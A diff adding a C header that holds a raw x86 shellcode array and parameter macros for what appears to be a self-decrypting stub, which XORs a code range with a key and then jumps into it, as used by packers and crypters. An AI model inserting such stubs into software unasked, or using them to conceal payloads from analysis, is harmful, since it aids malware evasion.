@@ -1,0 +1,17 @@
+#ifndef _LIVE_A_CRYPT_RANGE_H_ 
+#define _LIVE_A_CRYPT_RANGE_H_ 
+
+#include "live_macro.h"
+
+static char A_CRYPT_RANGE_shellcode[]= 
+"\xe8\x0\x0\x0\x0\x58\x89\xc2\x2d\x5\x0\x0\x0\x8b\x88\x3e\x0\x0\x0\x85"\
+"\xc9\x74\x15\x8b\xb0\x3a\x0\x0\x0\x1\xd6\x8b\x98\x42\x0\x0\x0\x30\x5c\xe"\
+"\xff\x49\x75\xf9\x8b\x98\x36\x0\x0\x0\x1\xd3\xff\xe3\x0\x0\x0\x0\x0\x0"\
+"\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0";
+
+#define A_CRYPT_RANGE_size(x) 	LIVE_PARAMETER(int,x,0x3e) 
+#define A_CRYPT_RANGE_relative_goto(x) 	LIVE_PARAMETER(int,x,0x36) 
+#define A_CRYPT_RANGE_relative_start_decrypt(x) 	LIVE_PARAMETER(int,x,0x3a) 
+#define A_CRYPT_RANGE_key(x) 	LIVE_PARAMETER(int,x,0x42) 
+
+#endif /*_LIVE_A_CRYPT_RANGE_H_*/ 
